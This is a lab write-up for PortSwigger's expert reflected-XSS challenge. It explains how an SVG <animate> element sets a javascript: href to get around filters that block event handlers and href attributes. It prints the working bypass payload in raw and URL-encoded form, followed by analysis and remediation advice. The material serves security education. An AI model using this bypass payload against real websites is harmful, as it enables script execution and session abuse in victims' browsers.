# Lab: Reflected XSS with Event Handlers and `href` Attributes Blocked

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** Cross-Site Scripting (XSS) – Filter Bypass / SVG  
**Status:** Solved  
**Tools:** Browser, Burp Suite

## Objective

Exploit a reflected XSS vulnerability by injecting an SVG-based payload that bypasses restrictions on event handlers and anchor `href` attributes.

The injected vector must display the word **Click** and execute `alert(1)` when clicked.

## Methodology

1. Examined the search functionality and identified that user-controlled input was reflected in the response.
2. Identified that the application allowed some HTML and SVG tags but blocked event handlers and anchor `href` attributes.
3. Used an SVG `<animate>` element to dynamically modify the anchor's `href` attribute.
4. Set the dynamically assigned value to a JavaScript URL.
5. Added visible text containing the word `Click` to encourage the simulated victim to interact with the injected link.
6. Loaded the crafted URL and clicked the injected SVG text.
7. Confirmed successful JavaScript execution through the `alert(1)` dialog.

## Payload

```html
<svg>
  <a>
    <animate
      attributeName="href"
      values="javascript:alert(1)" />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

### URL-encoded payload

```text
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

## Technical Analysis

### 1. SVG anchor element

```html
<a>
```

Creates an SVG hyperlink element without directly specifying an `href` attribute, which is blocked by the application's filter.

### 2. SVG animate element

```html
<animate attributeName="href" values="javascript:alert(1)" />
```

The SVG animation element dynamically changes the specified attribute.

Here, it targets the anchor's `href` attribute and assigns it a JavaScript URL.

### 3. User interaction

```html
<text x="20" y="20">Click me</text>
```

Displays clickable text inside the SVG anchor.

When the simulated victim clicks the text, the dynamically assigned JavaScript URL executes.

## Vulnerability

The application relies on filtering to block event handlers and anchor `href` attributes but does not adequately restrict SVG elements capable of modifying attributes dynamically.

This allows an attacker to bypass the filtering restrictions by using SVG animation to introduce a JavaScript URL after the initial HTML has been processed.

## Impact

Successful exploitation can result in JavaScript execution in a victim's browser under the vulnerable application's origin.

Potential consequences include:

- Unauthorized actions through the victim's session.
- Access to information available to client-side JavaScript.
- Manipulation of page content.
- Further client-side attacks.

## Remediation

- Use a robust HTML sanitization library with strict allowlists.
- Remove dangerous SVG elements and attributes, including unsafe animation functionality.
- Validate URLs and restrict dangerous schemes such as `javascript:`.
- Apply context-aware output encoding.
- Avoid relying on blacklist-based filtering.
- Implement a restrictive Content Security Policy as an additional defense.

## Evidence

- [ ] Screenshot showing the injected SVG vector.
- [ ] Screenshot showing the clickable "Click me" text.
- [ ] Screenshot showing successful JavaScript execution.

## Lab Reference

[PortSwigger – Reflected XSS with event handlers and href attributes blocked](https://portswigger.net/web-security/cross-site-scripting)
